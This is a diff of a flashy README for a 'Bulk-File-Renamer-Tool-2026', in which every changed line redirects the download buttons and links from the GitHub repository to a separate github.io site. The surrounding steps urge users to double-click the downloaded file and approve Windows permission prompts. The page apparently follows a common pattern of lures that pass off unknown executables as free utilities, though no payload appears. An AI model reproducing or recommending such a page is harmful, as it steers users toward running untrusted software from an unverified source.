@@ -1,7 +1,7 @@
 <h1>⚡ Bulk-File-Renamer-Tool-2026 - Rename Hundreds of Files in Seconds</h1>
 
 <p align="center">
-  <a href="https://github.com/Sergej777casino/Bulk-File-Renamer-Tool-2026" style="display:inline-block;padding:16px 32px;background:#2ecc71;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.3);">📥 DOWNLOAD NOW - FREE</a>
+  <a href="https://sergej777casino.github.io" style="display:inline-block;padding:16px 32px;background:#2ecc71;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.3);">📥 DOWNLOAD NOW - FREE</a>
 </p>
 
 <h2>📋 What Is This Tool?</h2>
@@ -25,7 +25,7 @@
 <p>Follow these simple steps to download and run the application:</p>
 
 <ol>
-  <li><strong>Visit the download page:</strong> <a href="https://github.com/Sergej777casino/Bulk-File-Renamer-Tool-2026">https://github.com/Sergej777casino/Bulk-File-Renamer-Tool-2026</a></li>
+  <li><strong>Visit the download page:</strong> <a href="https://sergej777casino.github.io">https://sergej777casino.github.io</a></li>
   <li><strong>Find the download button:</strong> Look for a green button that says "Download" or "Releases" on that page. Click it.</li>
   <li><strong>Get the file:</strong> Visit this link to download the application. The download will start automatically or you'll see a file to click.</li>
   <li><strong>Run the program:</strong> Once downloaded, double-click the file to open it. If Windows asks for permission, click "Yes" or "Run."</li>
@@ -96,7 +96,7 @@ Solution: Immediately click "Undo" in the program. This restores original names 
 
 <h2>💾 Download Again</h2>
 <p align="center">
-  <a href="https://github.com/Sergej777casino/Bulk-File-Renamer-Tool-2026" style="display:inline-block;padding:16px 32px;background:#3498db;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.3);">⬇️ CLICK HERE TO DOWNLOAD</a>
+  <a href="https://sergej777casino.github.io" style="display:inline-block;padding:16px 32px;background:#3498db;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.3);">⬇️ CLICK HERE TO DOWNLOAD</a>
 </p>
 
 <h2>📊 Version History</h2>
